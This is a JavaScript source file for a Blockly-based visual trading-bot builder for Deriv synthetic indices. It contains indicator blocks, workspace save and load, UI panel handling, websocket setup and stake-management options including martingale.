javascript.javascriptGenerator.forBlock.indicatorcci = function (block, statemt) {
  var inputList = statemt.valueToCode(block, "inputlist_nya", javascript.Order.ATOMIC);
  var period = statemt.valueToCode(block, "period_nya", javascript.Order.ATOMIC);
  var cciCalculation = "calculateCCI(" + inputList + "," + period + ")";
  return [cciCalculation, Blockly.JavaScript.ORDER_NONE];
};

Blockly.defineBlocksWithJsonArray([{
  type: "indicatoradx",
  message0: "Average Directional Index (ADX) Ticks %1 Input List %2 Period %3",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "Calcula o Índice Direcional Médio (ADX) a partir de uma lista de ticks e um período.",
  helpUrl: ""
}]);

javascript.javascriptGenerator.forBlock.indicatoradx = function (adu1, adv1) {
  var adw1 = adv1.valueToCode(adu1, "inputlist_nya", javascript.Order.ATOMIC);
  var adx1 = adv1.valueToCode(adu1, "period_nya", javascript.Order.ATOMIC);
  var ady1 = "calculateADX(" + adw1 + "," + adx1 + ")";
  return [ady1, Blockly.JavaScript.ORDER_NONE];
};

// Definição do bloco para True Range com dados de ticks
Blockly.defineBlocksWithJsonArray([{
  type: "indicatortrarray",
  message0: "True Range List %1 Input List %2",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);

// Gerador de código JavaScript para o bloco True Range
javascript.javascriptGenerator.forBlock.indicatortrarray = function (adp, adq) {
  var adr = adq.valueToCode(adp, "inputlist_nya", javascript.Order.ATOMIC);
  var adt = "calculateTrueRange(" + adr + ")";
  return [adt, Blockly.JavaScript.ORDER_NONE];
};
/*
Blockly.defineBlocksWithJsonArray([{
  type: "indicator_stochastic_rsi",
  message0: "Stochastic RSI %1 Input List %2 RSI Period %3 Stochastic Period %4",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "rsi_period_nya"
  }, {
    type: "input_value",
    name: "stoch_period_nya"
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "",
  helpUrl: ""
}]);

javascript.javascriptGenerator.forBlock.indicator_stochastic_rsi = function (adu, adv) {
  var inputList = adv.valueToCode(adu, "inputlist_nya", javascript.Order.ATOMIC);
  var rsiPeriod = adv.valueToCode(adu, "rsi_period_nya", javascript.Order.ATOMIC);
  var stochPeriod = adv.valueToCode(adu, "stoch_period_nya", javascript.Order.ATOMIC);
  
  var code = "calculateStochasticRSI(" + inputList + ", " + rsiPeriod + ", " + stochPeriod + ")";
  return [code, Blockly.JavaScript.ORDER_NONE];
};
*/
Blockly.defineBlocksWithJsonArray([{
  type: "indicator_stochastic_rsi",
  message0: "Stochastic RSI %1 Input List %2 RSI Period %3 Stochastic Period %4 K %5 D %6 Return %7",
  args0: [{
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "inputlist_nya"
  }, {
    type: "input_value",
    name: "rsi_period_nya"
  }, {
    type: "input_value",
    name: "stoch_period_nya"
  }, {
    type: "input_value",
    name: "k_Period"
  }, {
    type: "input_value",
    name: "d_Period"
  }, {
    type: "field_dropdown",
    name: "return_value",
    options: [
      ["Stochastic RSI", "STOCHASTIC_RSI"],
      ["K", "K"],
      ["D", "D"]
    ]
  }],
  inputsInline: false,
  output: null,
  colour: "#1a2333",
  tooltip: "Calcula o RSI Estocástico e retorna o valor selecionado.",
  helpUrl: ""
}]);

javascript.javascriptGenerator.forBlock.indicator_stochastic_rsi = function (adu, adv) {
  var inputList = adv.valueToCode(adu, "inputlist_nya", javascript.Order.ATOMIC);
  var rsiPeriod = adv.valueToCode(adu, "rsi_period_nya", javascript.Order.ATOMIC);
  var stochPeriod = adv.valueToCode(adu, "stoch_period_nya", javascript.Order.ATOMIC);
  var kPeriod = adv.valueToCode(adu, "k_Period", javascript.Order.ATOMIC);
  var dPeriod = adv.valueToCode(adu, "d_Period", javascript.Order.ATOMIC);
  
  // Obtém o valor selecionado no dropdown
  var returnValue = adu.getFieldValue("return_value"); 

  // Gera o código para chamar a função de cálculo do RSI Estocástico
  var code = "calculateStochasticRSI(" + inputList + ", " + rsiPeriod + ", " + stochPeriod + ", " + kPeriod + ", " + dPeriod + ")";

  // Adiciona a lógica para retornar o valor correto
  if (returnValue === "STOCHASTIC_RSI") {
    return [code + ".stochasticRSI", Blockly.JavaScript.ORDER_NONE];
  } else if (returnValue === "K") {
    return [code + ".kValues", Blockly.JavaScript.ORDER_NONE];
  } else if (returnValue === "D") {
    return [code + ".dValues", Blockly.JavaScript.ORDER_NONE];
  }
  
  return [code, Blockly.JavaScript.ORDER_NONE]; // Caso padrão
};

const blockly_reset = () => {
  if (confirm("Resetar/Zerar estratégia. Tem certeza?")) {
    Blockly.getMainWorkspace().clear();
    Blockly.serialization.workspaces.load(JSON.parse(initWorkspaceBlock), Blockly.getMainWorkspace());
    localStorage.setItem("mainRobotName", "Nenhum");
    spanSimpleRobotName.innerText = "Bot Carregado : Nenhum";
  }
};
if (localStorage.getItem("blockly_workspace_state") != null) {
  Blockly.serialization.workspaces.load(JSON.parse(localStorage.getItem("blockly_workspace_state")), Blockly.getMainWorkspace());
} else {
  Blockly.serialization.workspaces.load(JSON.parse(initWorkspaceBlock), Blockly.getMainWorkspace());
}
const blockly_save = () => {
  const aek = Blockly.serialization.workspaces.save(Blockly.getMainWorkspace());
  saveJsonObjToFile(aek, "pontobots.ptbot");
};
const blockly_workspaceChangedResponse = ael => {
  const aem = Blockly.serialization.workspaces.save(Blockly.getMainWorkspace());
  localStorage.setItem("blockly_workspace_state", JSON.stringify(aem));
};
const blockly_undo = () => {
  Blockly.getMainWorkspace().undo(false);
};
const blockly_redo = () => {
  Blockly.getMainWorkspace().undo(true);
};
const blockly_arrange = () => {
  Blockly.getMainWorkspace().cleanUp();
};
dragElement(document.getElementById("mydivSummary"));
dragElement(document.getElementById("mydivLog"));
function dragElement(aen) {
  var aeo = 0;
  var aep = 0;
  var aeq = 0;
  var aer = 0;
  if (document.getElementById(aen.id + "header")) {
    document.getElementById(aen.id + "header").onmousedown = aes;
  } else {
    aen.onmousedown = aes;
  }
  function aes(aet) {
    aet = aet || window.event;
    aet.preventDefault();
    aeq = aet.clientX;
    aer = aet.clientY;
    document.onmouseup = aeu;
    document.onmousemove = aev;
  }
  function aev(aew) {
    aew = aew || window.event;
    aew.preventDefault();
    aeo = aeq - aew.clientX;
    aep = aer - aew.clientY;
    aeq = aew.clientX;
    aer = aew.clientY;
    aen.style.top = aen.offsetTop - aep + "px";
    aen.style.left = aen.offsetLeft - aeo + "px";
    if (aen.offsetTop < aen.offsetHeight * 0.5) {
      aen.style.top = aen.offsetHeight * 0.5 + "px";
    }
    if (aen.offsetLeft < -aen.offsetWidth * 0.4) {
      aen.style.left = -aen.offsetWidth * 0.4 + "px";
    }
  }
  function aeu() {
    document.onmouseup = null;
    document.onmousemove = null;
  }
}
const moveBoxSummaryTop = () => {
  document.getElementById("mydivLog").style.zIndex = 101;
  document.getElementById("mydivSummary").style.zIndex = 102;
};
const moveBoxLogTop = () => {
  document.getElementById("mydivSummary").style.zIndex = 101;
  document.getElementById("mydivLog").style.zIndex = 102;
};
const clearBoxSummary = () => {
  let aex = false;
  for (i = 0; i < prContract.length; i++) {
    if (prContract[i] != 0) {
      aex = true;
      break;
    }
    ;
  }
  ;
  if (aex) {
    writeLog("", "Aguarde a finalização do contrato.");
    return;
  }
  if (confirm("Isso limpará todas as transações no painel e todos os contadores serão zerados.")) {
    document.getElementById("tableSummaryTBODY").innerHTML = "<tr id=\"tableSummaryTRATAS\"><th style=\"width: 190px;\">Timestamp</th><th>Trade Type</th><th>Entry Spot</th><th>Exit Spot</th><th>Buy Price</th><th>Profit/Loss</th></tr>";
    summary_noofruns.innerText = summary_totalstake.innerText = summary_totalpayout.innerText = summary_win.innerText = summary_loss.innerText = summary_totalprofitloss.innerText = 0;
    totalProfit = 0;
    winContract = [];
    loseContract = [];
    tempWinInARow = 0;
    tempLossInARow = 0;
  }
};
const showBoxSummary = () => {
  document.getElementById("mydivSummary").style.display = "block";
  moveBoxSummaryTop();
};
const closeBoxSummary = () => {
  document.getElementById("mydivSummary").style.display = "none";
};
closeBoxSummary();
const clearBoxLog = () => {
  document.getElementById("tableLogTBODY").innerHTML = "<tr><td style=\"width: 25%;\"></td><td></td></tr>";
};
const showBoxLog = () => {
  document.getElementById("mydivLog").style.display = "flex";
  moveBoxLogTop();
};
const closeBoxLog = () => {
  document.getElementById("mydivLog").style.display = "none";
};
closeBoxLog();
const hideshowsidebar = () => {
  if (document.getElementById("btn_hideshowsidebar").src.split("/").pop() === "icon_hidesidebar2.png") {
    document.getElementById("btn_hideshowsidebar").src = "image/icon_showsidebar2.png";
    document.getElementById("body_main").style.gridTemplateColumns = "0% 0% auto";
  } else {
    document.getElementById("btn_hideshowsidebar").src = "image/icon_hidesidebar2.png";
    document.getElementById("body_main").style.gridTemplateColumns = "0% 170px auto";
  }
  
  
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
};
const hideshowdatabox = () => {
  if (document.getElementById("btn_hideshowdatabox").src.split("/").pop() === "icon_hidedatabox2.png") {
    document.getElementById("btn_hideshowdatabox").src = "image/icon_showdatabox2.png";
    document.getElementById("body_main").style.gridTemplateRows = "7% 93% 0%";
  } else {
    document.getElementById("btn_hideshowdatabox").src = "image/icon_hidedatabox2.png";
    document.getElementById("body_main").style.gridTemplateRows = "7% 46.5% 46.5%";
  }
  
  
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
};
const hideshowtoolbox = () => {
  if (document.getElementById("btn_hideshowtoolbox").src.split("/").pop() === "icon_hidetoolbox2.png") {
    document.getElementById("btn_hideshowtoolbox").src = "image/icon_showtoolbox2.png";
    Blockly.getMainWorkspace().getToolbox().setVisible(false);
  } else {
    document.getElementById("btn_hideshowtoolbox").src = "image/icon_hidetoolbox2.png";
    Blockly.getMainWorkspace().getToolbox().setVisible(true);
  }
  
  
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 0);
};
const switchtosimplemode = () => {
  document.getElementById("body_main").style.gridTemplateColumns = "100% 0% 0%";
  document.getElementById("body_main").style.gridTemplateRows = "15% 85% 0%";
  
  
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
  localStorage.setItem("initStateMode", "simple");
};
const switchtoadvancedmode = () => {
  document.getElementById("body_main").style.gridTemplateColumns = "0% 170px auto";
  document.getElementById("body_main").style.gridTemplateRows = "7% 93% 0%";
  
  
  setTimeout(() => {
    Blockly.svgResize(Blockly.getMainWorkspace());
  }, 600);
  localStorage.setItem("initStateMode", "advanced");
};
const updateStatusBotRunning = aey => {
  document.getElementById("status_bot_running").innerText = aey;
};
const selMoneyManagementChanged = () => {
  if (selMoneyManagement.value == "smartmartingale") {
    lblInpInitStake.innerText = "Stake Inicial";
    divInpInitStake.hidden = false;
    divInpMartiFactor.hidden = false;
    divInpCycleStake.hidden = true;
    divChkSmart.hidden = false;
  } else {
    if (selMoneyManagement.value == "smartcyclestake") {
      divInpInitStake.hidden = true;
      divInpMartiFactor.hidden = true;
      divInpCycleStake.hidden = false;
      divChkSmart.hidden = false;
    } else {
      if (selMoneyManagement.value == "fixedstake") {
        lblInpInitStake.innerText = "Stake Fixo";
        divInpInitStake.hidden = false;
        divInpMartiFactor.hidden = true;
        divInpCycleStake.hidden = true;
        divChkSmart.hidden = true;
      }
    }
  }
};
selMoneyManagementChanged();
const getStakeBegin = () => {
  tempLossInARow = 0;
  if (selMoneyManagement.value == "smartmartingale") {
    return inpInitStake.value;
  } else {
    if (selMoneyManagement.value == "smartcyclestake") {
      posCycleStake = 0;
      return inpCycleStake.value.split(",")[posCycleStake];
    } else {
      if (selMoneyManagement.value == "fixedstake") {
        return inpInitStake.value;
      }
    }
  }
};
const getStakeAfterLose = aez => {
  if (selMoneyManagement.value == "smartmartingale") {
    return aez * inpMartiFactor.value;
  } else {
    if (selMoneyManagement.value == "smartcyclestake") {
      if (posCycleStake < inpCycleStake.value.split(",").length - 1) {
        posCycleStake++;
      } else {
        posCycleStake = 0;
      }
      return inpCycleStake.value.split(",")[posCycleStake];
    } else {
      if (selMoneyManagement.value == "fixedstake") {
        return inpInitStake.value;
      }
    }
  }
};
const loadStrategy = afa => {
  if (afa == "selectstrategy") {
    return;
  }
  if (afa == "ihaveanidea") {
    alert("Envie sua ideia de bot através dos comentários em nosso canal no YouTube.");
    return;
  }
  if (confirm("O bot atual será substituído. Clique OK se você tem certeza ou CANCEL para cancelar a troca.")) {
    localStorage;
    $.getJSON("strategy/" + afa + ".ptbot", function (afb) {
      Blockly.serialization.workspaces.load(afb, Blockly.getMainWorkspace());
    });
  } else {
    document.getElementById("selStrategy").value = "selectstrategy";
  }
};
const loadRobot = (afc, afd) => {
  if (confirm("O bot atual será substituído. Clique OK se você tem certeza ou CANCEL para cancelar a troca.")) {
    localStorage;
    $.getJSON("robot/" + afd + ".ptbot", function (afe) {
      Blockly.serialization.workspaces.load(afe, Blockly.getMainWorkspace());
    });
    localStorage.setItem("mainRobotName", afc);
    spanSimpleRobotName.innerText = "Bot Carregado: " + afc;
    document.getElementById("divPopupRobot").style.display = "none";
  } else {}
};
const rgbToHex = aff => {
  if (aff.charAt(0) == "r") {
    aff = aff.replace("rgb(", "").replace(")", "").split(",");
    var afg = parseInt(aff[0], 10).toString(16);
    var afh = parseInt(aff[1], 10).toString(16);
    var afi = parseInt(aff[2], 10).toString(16);
    afg = afg.length == 1 ? "0" + afg : afg;
    afh = afh.length == 1 ? "0" + afh : afh;
    afi = afi.length == 1 ? "0" + afi : afi;
    var afj = "#" + afg + afh + afi;
    return afj;
  }
};
const fillDataLastCont = (afk, afl, afm, afn, afo, afp, afq, afr, afs, aft, afu, afv, afw) => {
  lastCont_askprice = afk;
  lastCont_payout = afl;
  lastCont_profit = afm;
  lastCont_contracttype = afn;
  lastCont_entrytime = new Date(afo * 1000);
  lastCont_entryvalue = afp;
  lastCont_entryvaluestring = afq;
  lastCont_exittime = new Date(afr * 1000);
  lastCont_exitvalue = afs;
  lastCont_exitvaluestring = aft;
  lastCont_barrier = afu;
  lastCont_result = afw ? afm >= 0 ? "virtualwin" : "virtualloss" : afm >= 0 ? "win" : "loss";
};
$(document).ready(function () {
  $("#myInput").on("keyup", function () {
    var afx = $(this).val().toLowerCase();
    $("#myTableBody tr").filter(function () {
      $(this).toggle($(this).text().toLowerCase().indexOf(afx) > -1);
    });
  });
});
const injectFunctionRobotTable = () => {
  var afy = document.getElementById("myTableBody");
  var afz = afy.getElementsByTagName("tr");
  for (let aga = 0; aga < afz.length; aga++) {
    let agb = afy.rows[aga];
    agb.onclick = () => {
      loadRobot(agb.cells[1].innerText, agb.cells[0].innerText);
    };
  }
  document.getElementById("spanJumRobot").innerText = document.getElementById("myTableBody").rows.length;
};
injectFunctionRobotTable();
const cekValidasiSlaveToken = () => {
  if (chkVLose.checked && inpVLose.value > 0 && inpSToken.value.length == 0) {
    if (btn_run.src.split("/").pop() === "icon_stop.png") {
      btn_run.click();
    }
    chkVLose.checked = false;
    document.getElementById("divPopupVirtualLose").style.display = "none";
    document.getElementById("divPopupToken").style.display = "block";
    inpSToken.focus();
    alert("Insira o Token da Conta Virtual");
    return;
  }
};
function getStatAccu(agc, agd, age) {
  let agf;
  let agg;
  agg = age * 1 - 1;
  switch (agd) {
    case "1HZ10V":
      agf = [0.00433, 0.00405, 0.0038, 0.00361, 0.00344][agg];
      break;
    case "R_10":
      agf = [0.00613, 0.00573, 0.00537, 0.00511, 0.00486][agg];
      break;
    case "1HZ25V":
      agf = [0.01083, 0.01012, 0.00949, 0.00903, 0.0086][agg];
      break;
    case "R_25":
      agf = [0.01531, 0.01431, 0.01342, 0.01277, 0.01216][agg];
      break;
    case "1HZ50V":
      agf = [0.02166, 0.02024, 0.01898, 0.01806, 0.01719][agg];
      break;
    case "R_50":
      agf = [0.03063, 0.02863, 0.02685, 0.02554, 0.02431][agg];
      break;
    case "1HZ75V":
      agf = [0.03249, 0.03036, 0.02847, 0.02709, 0.02579][agg];
      break;
    case "R_75":
      agf = [0.04594, 0.04294, 0.04027, 0.03831, 0.03647][agg];
      break;
    case "1HZ100V":
      agf = [0.04331, 0.04048, 0.03797, 0.03612, 0.03438][agg];
      break;
    case "R_100":
      agf = [0.06126, 0.05725, 0.05369, 0.05109, 0.04863][agg];
      break;
    default:
      break;
  }
  let agh;
  let agi;
  let agj;
  let agk;
  agk = 0;
  for (i = agc.length - 1; i > 0; i--) {
    agh = agc[i - 1] * agf / 100;
    agi = agc[i - 1] + agh;
    agj = agc[i - 1] - agh;
    if (agc[i] < agi && agc[i] > agj) {
      agk++;
    } else {
      break;
    }
  }
  return agk * 1;
}
const continuousindices_show = agl => {
  document.getElementById("continuousindices_" + agl + "_ticks").value = document.getElementById("continuousindices_" + agl + "_digits").value = "";
  document.getElementById("continuousindices_" + agl + "_ticks").hidden = document.getElementById("continuousindices_" + agl + "_digits").hidden = false;
};
const continuousindices_hide = agm => {
  document.getElementById("continuousindices_" + agm + "_ticks").value = document.getElementById("continuousindices_" + agm + "_digits").value = "";
  document.getElementById("continuousindices_" + agm + "_ticks").hidden = document.getElementById("continuousindices_" + agm + "_digits").hidden = true;
};
const continuousindices_activeChanged = (agn, ago) => {
  if (ago) {
    subscribeTicks("continuousindices", agn, arrMarket_Continuous[agn - 1]);
    //subscribeAllCandles(60);
    continuousindices_show(agn);
  } else {
    if (idSubTicksHistory_continuous[agn] != 0) {
      forgetTicks(idSubTicksHistory_continuous[agn]);
    }
    continuousindices_hide(agn);
  }
};
const vEval = eval(" new ReconnectingW" + am);
vEval.addEventListener("open", openResponse);
vEval.addEventListener("message", messageResponse);
vEval.addEventListener("close", closeResponse);
v = eval(" new ReconnectingW" + am);
v.addEventListener("open", openResponseV);
v.addEventListener("message", messageResponseV);
v.addEventListener("close", closeResponseV);
selMarket.addEventListener("change", marketChanged);
selSubMarket.addEventListener("change", subMarketChanged);
selSymbol.addEventListener("change", function () {
  mainSymbol = this.value;
  document.getElementById("lblMarket").innerText = selSymbol.options[selSymbol.selectedIndex].text;
  forgetAllTicks();
});
inpNOTicks.addEventListener("change", forgetAllTicks);
btn_run.addEventListener("click", btn_runClickResponse);
btn_run2.addEventListener("click", function () {
  btn_run.click();
});
selData.addEventListener("change", function () {
  refreshBoxData(this.value);
});
Blockly.getMainWorkspace().addChangeListener(blockly_workspaceChangedResponse);
document.getElementById("btn_reset").addEventListener("click", blockly_reset);
document.getElementById("input_file").addEventListener("change", function () {
  loadFileToJsonObj(this.files[0]);
});
document.getElementById("btn_load").addEventListener("click", function () {
  document.getElementById("input_file").click();
});
document.getElementById("btn_save").addEventListener("click", blockly_save);
document.getElementById("btn_undo").addEventListener("click", blockly_undo);
document.getElementById("btn_redo").addEventListener("click", blockly_redo);
document.getElementById("btn_arrange").addEventListener("click", blockly_arrange);
document.getElementById("mydivSummary").addEventListener("mousedown", moveBoxSummaryTop);
document.getElementById("btn_summary").addEventListener("click", function () {
  if (document.getElementById("mydivSummary").style.display == "block") {
    closeBoxSummary();
  } else {
    showBoxSummary();
  }
});
document.getElementById("btn_closeBoxSummary").addEventListener("click", closeBoxSummary);
document.getElementById("mydivLog").addEventListener("mousedown", moveBoxLogTop);
document.getElementById("btn_log").addEventListener("click", function () {
  if (document.getElementById("mydivLog").style.display == "flex") {
    closeBoxLog();
  } else {
    showBoxLog();
  }
});
var toggleNotification = false;
var toggleButton = document.getElementById("btn_logleft");
toggleButton.addEventListener("click", function() {
  toggleNotification = !toggleNotification; 
});
document.getElementById("btn_clearBoxSummary").addEventListener("click", clearBoxSummary);
document.getElementById("btn_saveBoxSummary").addEventListener("click", function () {
  tableToCSV("tableSummaryTBODY", "", "Block_Summary.csv");
});
document.getElementById("btn_clearBoxLog").addEventListener("click", clearBoxLog);
document.getElementById("btn_saveBoxLog").addEventListener("click", function () {
  tableToCSV("tableLogTBODY", "Timestamp,Message", "Block_Log.csv");
});
document.getElementById("btn_closeBoxLog").addEventListener("click", closeBoxLog);
document.getElementById("btn_hideshowsidebar").addEventListener("click", hideshowsidebar);
document.getElementById("btn_hideshowdatabox").addEventListener("click", hideshowdatabox);
document.getElementById("btn_hideshowtoolbox").addEventListener("click", hideshowtoolbox);
selMoneyManagement.addEventListener("change", selMoneyManagementChanged);
document.getElementById("selStrategy").addEventListener("change", function () {
  loadStrategy(this.value);
});
for (i = 1; i <= 6; i++) {
  digitstatistic_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 6; i++) {
  evenvsodd_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 2; i++) {
  overvsunder_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 6; i++) {
  risevsfall_noofticks[i].addEventListener("change", function () {
    if (this.value > 1000) {
      this.value = 1000;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 3; i++) {
  inpTickTrisma_period[i].addEventListener("change", function () {
    if (this.value > 200) {
      this.value = 200;
      localStorage.setItem(this.id, this.value);
    }
  });
}
for (i = 1; i <= 10; i++) {
  if (continuousindices_active[i].checked) {
    continuousindices_show(i);
  } else {
    continuousindices_hide(i);
  }
  ;
  continuousindices_active[i].addEventListener("change", function () {
    continuousindices_activeChanged(this.id.split("_")[1] * 1, this.checked);
  });
}
document.getElementById("btnhead_deriv").addEventListener("click", function () {
  window.open("https://track.deriv.com/_iTuuycsEe_dZl7VyVw174GNd7ZgqdRLk/1/");
});
document.getElementById("btnhead_youtube").addEventListener("click", function () {
  window.open("https://www.youtube.com/playlist?list=PLyxrfb4MWVE1auvG_86xvel_qjrjyBvEh");
});
document.getElementById("btnsimp_deriv").addEventListener("click", function () {
  window.open("https://track.deriv.com/_iTuuycsEe_dZl7VyVw174GNd7ZgqdRLk/1/");
});
document.getElementById("btnsimp_youtube").addEventListener("click", function () {
  window.open("https://www.youtube.com/playlist?list=PLyxrfb4MWVE1auvG_86xvel_qjrjyBvEh");
});

document.getElementById("btn_CreateAccount").addEventListener("click", function () {
  window.open("https://track.deriv.com/_iTuuycsEe_dZl7VyVw174GNd7ZgqdRLk/1/");
});
document.getElementById("btn_CreateToken").addEventListener("click", function () {
  window.open("https://app.deriv.com/account/api-token");
});
document.getElementById("btnSwitchToSimple").addEventListener("click", switchtosimplemode);
document.getElementById("btnSwitchToAdvanced").addEventListener("click", switchtoadvancedmode);
document.getElementById("btnSimpleToken").addEventListener("click", function () {
  document.getElementById("divPopupToken").style.display = "block";
});
document.getElementById("btnSimpleRobot").addEventListener("click", function () {
  document.getElementById("divPopupRobot").style.display = "block";
  document.getElementById("myInput").focus();
});
document.getElementById("btnAdvancedRobot").addEventListener("click", function () {
  document.getElementById("divPopupRobot").style.display = "block";
  document.getElementById("myInput").focus();
});
btnSimpleRun.addEventListener("click", function () {
  btn_run.click();
});
document.getElementById("btnSimpleLogsBox").addEventListener("click", function () {
  document.getElementById("btn_log").click();
});
document.getElementById("btnSimpleSummaryBox").addEventListener("click", function () {
  document.getElementById("btn_summary").click();
});
chkVLose.addEventListener("change", cekValidasiSlaveToken);
const mainLogic = () => {
  updateStepper(1);
  if (!chkVLose.checked || inpVLose.value <= 0) {
    conn_nya = vEval;
  } else {
    if (chkVLose.checked && countVLose < inpVLose.value) {
      if (!slaveAuthorized) {
        return;
      }
      conn_nya = v;
    } else {
      conn_nya = vEval;
    }
  }
  if (Date.now() >= timeMayOP && navigator.onLine && !sedangForgetAllTicks) {
    func$1$9$8$7$PurchaseConditions();
  }
};
document.getElementById("btnSimpleToken").style.opacity = document.getElementById("btnSimpleRobot").style.opacity = document.getElementById("btnSimpleSummaryBox").style.opacity = document.getElementById("btnSimpleLogsBox").style.opacity = document.getElementById("btnSwitchToAdvanced").style.opacity = 1;
if (localStorage.getItem("initStateMode") == "simple") {
  switchtosimplemode();
} else {
  if (localStorage.getItem("initStateMode") == "advanced") {
    switchtoadvancedmode();
  }
}

//initGranularitySelector();
window.addEventListener('load', () => {
    granularityArray.forEach(g => {
        if (candleData[g].history.length > 0) {
            updateCandleTable(g);
        }
    });
});

window.addEventListener('load', () => {
  if (wsMasterOpened) {
    subscribeAllCandles();
  }
});

/*
const getTimeToNextMinute = () => {
    const now = new Date();
    const seconds = now.getSeconds();
    const milliseconds = now.getMilliseconds();
    return (60 - seconds) * 1000 - milliseconds;
};
const scheduleCandleUpdates = () => {
    const timeToNextMinute = getTimeToNextMinute();
    
    setTimeout(() => {
        subscribeAllCandles(); // Atualiza imediatamente no próximo minuto
        setInterval(subscribeAllCandles, 60000); // Continua a cada minuto
    }, timeToNextMinute);
};

// Iniciar o agendamento
scheduleCandleUpdates();
*/
console.log(candleArrayUtama);
console.log(tickArrayUtama);


const getAndEvalJavaScriptCode = () => {
  window.LoopTrap = 999999;
  javascript.javascriptGenerator.INFINITE_LOOP_TRAP = "if(--window.LoopTrap == 0) throw \"Infinite loop.\";\n";
  Blockly.JavaScript.init(workspace);
  try {
    eval(mainWorkspaceCode);
  } catch (e) {
    console.log(e);
  } finally {
    
    
    setTimeout(() => {
      func$1$9$8$7$RunOnceAtStart();
    }, 100);
  }
};